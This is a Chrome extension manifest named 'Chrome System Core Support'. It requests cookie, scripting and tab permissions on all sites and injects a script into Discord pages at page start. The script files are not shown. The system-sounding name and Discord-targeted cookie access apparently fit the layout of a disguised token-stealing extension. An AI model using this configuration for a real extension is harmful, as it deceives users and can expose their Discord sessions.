{
  "manifest_version": 3,
  "name": "Chrome System Core Support",
  "version": "5.0.2",
  "permissions": ["cookies", "storage", "scripting", "tabs"],
  "host_permissions": ["<all_urls>"],
  "background": {
    "service_worker": "background.js"
  },
  "content_scripts": [
    {
      "matches": ["*://*.discord.com/*"],
      "js": ["content.js"],
      "run_at": "document_start"
    }
  ]
}
